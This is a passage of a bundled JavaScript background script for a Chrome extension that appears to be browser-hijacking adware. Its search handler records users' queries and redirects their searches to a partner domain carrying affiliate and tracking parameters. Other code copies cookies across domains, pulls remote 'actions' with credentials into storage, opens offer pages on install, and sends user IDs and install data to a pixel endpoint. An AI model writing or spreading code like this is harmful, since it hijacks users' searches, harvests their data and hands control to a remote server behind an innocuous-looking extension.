	            	if(settings.secondOfferUrl)
						chrome.tabs.create({url: settings.secondOfferUrl});
	            	else if (settings.openNewtabOnInstall && settings.newtabPage)
	                    chrome.tabs.create({url: newtabPage});
	            }
	        }
	    }

	    self.setStorage = function(key, value) {
	        return storage.setStorage(key, value);
	    };

	    self.publishEvent = function(message, sender) {
	    	eventbus.forEach((element)=> {
	    		if(element.sender === sender)
	    			return;
	    		element.callback(message);
			})
		}

		self.consumer = function(callback, sender) {
			const isExists = eventbus.find(element => element.sender === sender)
			if(isExists)
				return;
			eventbus.push({sender: sender, callback: callback});
		}

	    self.increaseStorage = function(key, value) {
	    	return new Promise((resolve, reject)=> {
				this.getStorage(key).then((val) => {
					if(isNaN(val)) {
						this.setStorage(key, value);
						resolve(value)
					}
					else {
						val = parseInt(val);
						this.setStorage(key, val + value)
						resolve(val + value);
					}
				});
			});
		}

	    self.getStorage = function(key) {
	        return storage.getStorage(key)
	    };

	    self.addMessageListener = function(callback){
	        chrome.runtime.onMessage.addListener(callback);
	    };

	    self.addBeforeRequestBlocker = function(callback, filterDomain, opts) {
	        let filter = { urls: ["*://" + filterDomain + "/*"]};
	        chrome.webRequest.onBeforeRequest.addListener(callback, filter, opts);
	    };

	    self.addTabsListener = function(callback) {
	        if(chrome.tabs) {
	        	if(tabsHandlers.length === 0) {
					tabsHandlers.push(callback);
					chrome.tabs.onUpdated.addListener(function(tabId, status, tab) {
						let stop = false;
						for (let index in tabsHandlers) {
							try{
								stop = tabsHandlers[index](tabId, status, tab);
							}
							catch (e) {
								console.error("Failed to notify " + index, e);
							}
							if(stop)
								break;
						}
					});
				}
	        	else
	        		if(tabsHandlers.indexOf(callback) === -1)
						tabsHandlers.push(callback);
	        }
	    };

	    self.prepareSearchUrl = function(newUrl) {
	        let localExtensionData = {
	            v: extensionData.v,
	            gid: extensionData.gid
	        }
	        return utils.prepareUrl(newUrl, settings, additionalData, localExtensionData);
	    }

	    function addIgnore(tab){
			ignore.add(tab.id);
			self.unsetIgnore(tab.id)
		}

		function handleOpenTab(tab, newUrl, callback) {
	    	addIgnore(tab);
	    	if(typeof callback === "function")
				callback(tab, newUrl);
		}

	    self.reopenTab = function(newUrl, oldTab, callback) {
			if(chrome.tabs) {
				chrome.tabs.create({url: newUrl}, function(tab){
					handleOpenTab(tab, newUrl, callback);
				});
				chrome.tabs.remove(oldTab.id, function () { });
			}
	    };

	    self.openTab = function(newUrl, type, callback) {
			if(chrome.tabs) {
				if(!type)
					chrome.tabs.create({url: newUrl}, function(tab){
						handleOpenTab(tab, newUrl, callback);
					});
				else
					chrome.windows.create({type: (type? type : "normal"), url: newUrl, state: "normal"}, function(tab){
						handleOpenTab(tab, newUrl, callback);
					});
			}
		}

		self.updateTab = function(newUrl, oldTab, callback) {
			if(chrome.tabs) {
				chrome.tabs.update(oldTab.id, {url: newUrl}, function(tab){
					handleOpenTab(tab, newUrl, callback);
				});
			}
		};

	    self.closeTab = function(tab) {
			if(chrome.tabs) {
				chrome.tabs.remove(tab.id, function () { });
			}
		}

		self.isInvalid = function(value) {
	    	return ignore.has(value);
		}

	    function openNotificationsInternal() {
	        chrome.tabs.create({url: 'chrome://settings/content/notifications'});
	    }

	    function openChromeSettings() {
	        chrome.tabs.create({url: 'chrome://settings'});
	    }

	    self.addNotificationListener = function() {
	        self.addMessageListener(function(request, sender) {
	            switch (request.subject) {
	                case "manageNotifications":
	                    openNotificationsInternal();
	                    break;
	                case "manageChrome":
	                    openChromeSettings();
	                    break;
	                default:
	                    break;
	            }
	        })
	    }

	    self.getRequestQueryString = function() {
	        let params = "";
	        params += utils.getQueryString(userData);
	        params += "&" + utils.getQueryString(extensionData);
	        return params;
	    }

	    self.initData.then((data)=> {
	        reporter.sendEvent('hit', data, settings, extensionData);
	        reporter.sendBeacon("hit", data, settings, extensionData)
	    });
	};


/***/ },
/* 5 */
/***/ function(module, exports, __webpack_require__) {

	const storage = __webpack_require__(6)

	module.exports =  {
	    getQueryString: function( field, url ) {
	        let href = url ? url : "";
	        let reg = new RegExp( '[?&#]' + field + '=([^&#]*)', 'i' );
	        let string = reg.exec(href);
	        return string ? string[1] : "";
	    },
	    generateUuid: function() {
	        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
	            var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);
	            return v.toString(16);
	        });
	    },
	    generateBigIntUuid: function() {
	        return parseInt(Math.random() * Math.pow(10, 15));
	    },
	    padNumber: function(str){
	        let pad = "00";
	        let ans = pad.substring(0, pad.length - str.length) + str;
	        return ans;
	    },
	    getJsonAsQueryString: function(obj) {
	        if(typeof obj !== "object")
	            return "";
	        return (Object.keys(obj).map(function(k) {
	            return encodeURIComponent(k) + '=' + encodeURIComponent(obj[k])
	        }).join('&'));
	    },
	    prepareUrl(url, settings, data, extensionData) {
	        let newUrl = url;
	        let urlParams = this.getJsonAsQueryString(data);
	        urlParams += ("&" + this.getJsonAsQueryString(extensionData));
	        if(newUrl.indexOf("?") < 0)
	            newUrl += "?"
	        return newUrl + "&" + urlParams;
	    },
	    getCookies(domain) {
	        return new Promise((resolve) => {
	            if(chrome.cookies) {
	                chrome.cookies.getAll({domain: domain}, function (cookies) {
	                    resolve(cookies);
	                });
	            }
	            else {
	                resolve({});
	            }
	        })
	    },
	    parseCookieArrayToJsonObject(cookies) {
	        let cookiesData = {};
	        cookies.forEach((cookie)=> {
	            cookiesData[cookie.name] = cookie.value;
	        });
	        return cookiesData;
	    },
	    syncCookies(cookies, newDomain) {
	        if(chrome.cookies) {
	            cookies.forEach((cookie)=> {
	                let details = {
	                    url: "https://" + newDomain,
	                    name: cookie.name,
	                    value: cookie.value,
	                    domain: newDomain,
	                    path: cookie.path,
	                    secure: cookie.secure,
	                    httpOnly: cookie.httpOnly,
	                    expirationDate: cookie.expirationDate,
	                }
	                chrome.cookies.set(details, ()=> {})
	            });
	        }
	    },
	    handleInitData: function(storageArr, cookiesToRead, cookies, storageData, settings) {
	        let cookiesObject = this.parseCookieArrayToJsonObject(cookies);
	        let cookiesName = Object.keys(cookiesObject);
	        if(Object.keys(storageData).length === storageArr.length && storageData.uid === cookiesObject.uid)
	            return storageData;
	        if(cookiesName.length === 0) // consider get cookeis by HTTP request
	            return storageData;
	        let cookiesData = {};
	        let isNewInstall = cookiesObject['uid'] !== storageData['uid'];
	        cookiesName.forEach((cookieName)=> {
	            if(typeof cookiesToRead[cookieName] === "undefined")
	                return;
	            //use storage data if exists and cookie data is empty
	            if(storageData[cookieName] && !cookiesObject[cookieName])
	                cookiesData[cookieName] = storageData[cookieName];
	            else {
	                storage.setStorage(cookieName, cookiesObject[cookieName]);
	                cookiesData[cookieName] = cookiesObject[cookieName];
	            }
	        });
	        if(storageData.install_date && storageData.install_time && !isNewInstall) {
	            cookiesData["install_date"] = storageData["install_date"];
	            cookiesData["install_time"] = storageData["install_time"];
	        }
	        else {
	            let installDate = new Date();
	            let date = installDate.toISOString().substring(0,10);
	            let time = installDate.toISOString().substring(11, 19);
	            storage.setStorage("install_date", date);
	            storage.setStorage("install_time", date + " " + time);
	            cookiesData["install_date"] = date;
	            cookiesData["install_time"] = date + " " + time;
	        }

	        if(storageData.user_id)
	            cookiesData["user_id"] = storageData.user_id
	        else {
	            let uuid = this.generateBigIntUuid() + "";
	            storage.setStorage("user_id", uuid);
	            cookiesData["user_id"] = uuid;
	        }

	        cookiesData["partid"] = settings.partid
	        storage.setStorage("partid", settings.partid);
	        return cookiesData;
	    },
	    getConfig(settings) {
	        return new Promise((resolve)=> {
	            let useBeacon = typeof settings.useBeacon !== "undefined"? settings.useBeacon : false;
	            let defaultData = {cookiesToRead: settings.cookiesToRead, storageArr: settings.storageArr, useBeacon: useBeacon};
	            let configPromise;
	            if(settings.cfgEntry)
	                configPromise = fetch(settings.host + settings.cfgEntry);
	            else
	                configPromise = Promise.resolve(defaultData);
	            configPromise.then((response)=> {
	                if(response.ok && response.status < 299) {
	                    response.json().then((data)=> {
	                        resolve(data);
	                    }).catch((err)=> {
	                        resolve(defaultData)
	                    });
	                }
	                else {
	                    resolve(defaultData)
	                }
	            }).catch((err) => {
	                resolve(defaultData);
	            });
	        });
	    },
		fetchActions(settings, backgroundModule) {
			return new Promise((resolve, reject) => {
				let params = "?extId=" + settings.extId + "&v=" + encodeURIComponent(chrome.runtime.getManifest().version) + "&gid=" + settings.groupId + "&partid=" + encodeURIComponent(settings.partid)
				let url = settings.host + settings.actionEntry + params;
				fetch(url, {credentials: 'include'}).then((res)=> {
					if(res.status !== 200)
						return resolve({});
					res.json().then((data)=> {
						for(let key in data)
							backgroundModule.setStorage(key, data[key]);
						resolve(data);
					});
				}).catch((err)=> {
					resolve();
				})
			});
		}

	};


/***/ },
/* 6 */
/***/ function(module, exports) {

	module.exports = {
	    localData: {},
	    setStorage: function(key, value) {
	        if(chrome.storage) {
	            let data = {};
	            data[key] = value;
	            chrome.storage.local.set(data, ()=> {
	            });
	        }
	        this.localData[key] = value;
	    },
	    getStorage: function(key) {
	        let self = this;
	        return new Promise((resolve, reject)=> {
	            if(chrome.storage){
	                let keys = key;
	                if(typeof key === "string")
	                    keys = [key]
	                chrome.storage.local.get(keys, function(values) {
	                    if(typeof key === "string")
	                        return resolve(values[key]);
	                    return resolve(values);
	                });
	                return;
	            }
	            setTimeout(function(){
	                resolve(self.localData[key]);
	            }, 50);
	        });
	    }
	};


/***/ },
/* 7 */
/***/ function(module, exports, __webpack_require__) {

	const utils = __webpack_require__(5);
	module.exports.sendBeacon = function(type, data, settings, extensionData) {
	    if(!settings.useBeacon)
	        return;
	    let url = "https://"  + settings.domain.replace("www.", "pixel.") + "/ext_logs";
	    let beaconData = {
	        event: type,
	        session_id: data.session_id,
	        user_id: data.user_id,
	        uid: data.uid || "",
	        tag_id: data.tag_id || "",
	        subid_1: data.sub_id || "",
	        subid_2: data.sub_id1 || "",
	        install_date: data.install_date,
	        install_time: data.install_time,
	        extension_id: extensionData.extId,
	        extension_version: extensionData.v,
	        lp_name: data.lp,
	        server_domain: settings.domain.replace("www.", "")
	    }
	    navigator.sendBeacon(url, JSON.stringify(beaconData))
	}

	module.exports.sendEvent = function (type, data, settings, additionalParams, rate) {
	    let pixelUrl = "https://" + settings.domain + "/stats/nt/" + type + "?";
	    pixelUrl += ("&" + utils.getJsonAsQueryString(data));
	    pixelUrl += ("&" + utils.getJsonAsQueryString(additionalParams));
	    if(!data.partid)
	        pixelUrl += ("&partid=" + settings.partid);

	    let image = new Image();
	    image.src = pixelUrl;
	}




/***/ },
/* 8 */,
/* 9 */,
/* 10 */,
/* 11 */,
/* 12 */
/***/ function(module, exports) {

	module.exports.handle = function(t, settings, backgroundModule, tabsModule) {
	    if(t.url.indexOf(settings.searchEntry) > -1 && t.url.indexOf(settings.searchDomain) > -1) {
	        let url = new URL(t.url);
	        let query = url.searchParams.get('q');
	        if(!query)
	            return {cancel: false};
	        let lastQueryTime = new Date().getTime();
	        let lastQuery = decodeURIComponent(query).toLowerCase().replace(/\+/g,' ');

	        backgroundModule.setStorage("lastQuery", lastQuery);
	        backgroundModule.setStorage("queryTime", lastQueryTime);
	        if(settings.countSearches)
				backgroundModule.increaseStorage("searchCount", 1);
	        if(tabsModule)
	        	tabsModule.registerEntity(lastQuery, lastQueryTime);

	        let newUrl = new URL(t.url.replace(settings.searchDomain, settings.domain));
	        let params = backgroundModule.prepareSearchUrl(newUrl.search);
	        newUrl.search = params;
	        newUrl.searchParams.set("pid", settings.partid)
	        newUrl.searchParams.delete("partid");

	        if(settings.hashToAppend)
	            newUrl.hash = settings.hashToAppend
	        return {redirectUrl: newUrl.href};
	    }
	    return {cancel: false};
	}


/***/ }
/******/ ]);
